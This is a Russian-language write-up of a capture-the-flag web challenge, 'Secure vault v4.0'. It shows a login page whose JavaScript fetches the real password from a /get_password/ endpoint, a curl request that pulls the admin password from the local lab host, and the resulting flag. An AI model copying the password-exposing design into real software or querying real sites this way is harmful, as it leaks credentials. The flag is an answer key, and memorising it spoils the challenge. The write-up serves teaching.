# Secure vault v4.0 writeup
На сайте есть форма логина с полями юзернейма и пароля. SQL-инъекции не работают, так что давайте изучать сайт в поиске интересного.

Кук нету, в html никаких секретиков. Единственное, что можно изучить - как отправляется форма. Взглянем на html формы:

```html
<form action="" method="post" class="justify-content-center" id="login-form" onsubmit="return validateForm();">
	<p>
	 	<label class="form-check-label" for="username" style="align:center">Username</label>
		<br>
		<input id="form-username" name="username" required type="text" value=""> </p>
	<p>
		<label class="form-check-label" for="password" style="align:center">Password</label>
		<br>
		<input id="form-password" name="password" required type="password" value="">
	</p>
	<p>
		<input class="btn btn-danger" id="form-button" name="submit" type="submit" value="Login">
	</p>
</form>
```

Как видно в тэге `<form>`,  обработкой формы занимается функция `validateForm()`. Взглянем на нее:

```js
var isCorrect = false;

function checkPassword() {
    let url = "/get_password/";
    let xhr = new XMLHttpRequest();

    xhr.open("GET", url + $("#form-username")[0].value + "/", false);
    xhr.onloadend = function () {
        let response = xhr.responseText;
        if (response == "INCORRECT_USERNAME") {
            $("#error-msg")[0].innerHTML = "Incorrect username."
        }
        else {
            let currPassword = $("#form-password")[0].value;
            if (currPassword == response) {
                isCorrect = true;
            }
            else {
                $("#error-msg")[0].innerHTML = "Incorrect password.";
            }
        }

    };

    xhr.setRequestHeader("Content-Type", "text/plain");
    xhr.send();
    return true;
}

function validateForm() {
    Promise.all(checkPassword())
    if (isCorrect) {
        isCorrect = false;
        return true;
    }
    return false;  
}
```

Функция получает пароль пользователя через GET-запрос на эндпоинт `/get_password/`. Далее оригинальный пароль сравнивается с тем, что ввел пользователь. Выходит, мы можем попробовать запросить пароль админа:

```bash
$ curl http://0.0.0.0:21011/get_password/admin/
c&azl+1xYqmNtxA#a?q
```

Попробуем войти под полученными учетными данными, в ответ получаем:

```html
<div class="p-3 mb-2 bg-secondary text-white row justify-content-center">
	li2CTF{H000000W????_M4n_1'll_b3_b4ck_1n_4_y34r_w17h_MUCH_b3773r__s3cUr1ty!}
</div>
```

Флаг: `li2CTF{H000000W????_M4n_1'll_b3_b4ck_1n_4_y34r_w17h_MUCH_b3773r__s3cUr1ty!}`
